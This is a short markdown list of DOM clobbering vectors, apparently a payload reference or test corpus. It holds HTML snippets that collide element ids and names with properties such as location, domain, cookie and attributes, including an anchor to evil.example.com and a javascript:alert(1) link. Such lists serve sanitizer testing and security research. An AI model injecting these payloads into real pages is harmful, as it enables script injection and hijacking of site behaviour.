# DOM Clobbering Vectors

## Form element clobbering

<form id="x"></form>

## Anchor clobbering

<a id="location" href="https://evil.example.com">click</a>

## Image with name attribute

<img name="domain" src="x.png">

## Embedded object with name

<embed name="cookie" src="x.swf">

## Nested clobbering with form

<form id="attributes"><input name="attributes"></form>

## Multiple id collisions

<div id="content">first</div>
<div id="content">second</div>

## Accessing globals via id

<a id="x" href="javascript:alert(1)">link</a>

## Named access via img

<img id="x" name="y" src="z.png">

## Clobbering via nested form

<form><form><input name="x">